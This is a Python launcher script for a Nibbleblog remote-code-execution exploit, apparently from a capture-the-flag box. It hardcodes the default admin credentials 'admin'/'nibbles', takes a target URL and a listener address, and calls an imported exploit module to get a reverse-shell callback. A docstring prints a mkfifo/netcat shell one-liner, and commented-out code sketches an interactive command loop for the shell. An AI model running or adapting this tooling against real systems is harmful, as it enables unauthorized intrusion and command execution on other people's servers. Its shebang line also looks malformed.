#!./venv/bin/active
import nibbleblog
import netlib
import requests
import argparse
import socket
import sys
import threading

def main():

    """ 
        Arbitrary Command Execution without -e

        $ rm -f /tmp/f; mkfifo /tmp/f
        $ cat /tmp/f | /bin/sh -i 2>&1 | nc -l 127.0.0.1 1234 > /tmp/f
    """
    """ Set default creds. Update later if provided. """
    username = 'admin'
    password = 'nibbles'

    """ Parse Arguments """
    parser = argparse.ArgumentParser()
    parser.add_argument("target",help="Target Nibbleblog installation",type=str)
    parser.add_argument("-c", "--credentials",help="Credentials in username:password format")
    parser.add_argument("listener",help="Listener address e.g. 10.10.14.5:4444")
    parser.add_argument("-x", "--proxy", help="Set http proxy")
    args = parser.parse_args()

    if args.credentials:
        credentials = args.credentials.split(":")
        username = credentials[0]
        password = credentials[1]
    else:
        print("No credentials provided, using default.")
    
    """ Init Exploit """
    cve = nibbleblog.Exploit()
    
    listen_sock = args.listener.split(":")
    listen_ip = listen_sock[0]
    listen_port = listen_sock[1]

    """
    listener = netlib.Listener()
    listener_thread = threading.Thread(target=listener.start, args=(listen_ip,listen_port))
    listener_thread.start()
    """

    cve.exploit(args.target, username, password, args.proxy, listen_ip, listen_port)
    print("Exploit finished, waiting for callback.")

    """
    try:
        while True:
            command = input('~$ ')
            if "exit" in command:
                sys.exit(0)
            listener.send(command)
    except KeyboardInterrupt:
        print("\nQuitting...")
        sys.exit(0)
    """
    sys.exit(0)

if __name__ == "__main__":
    main()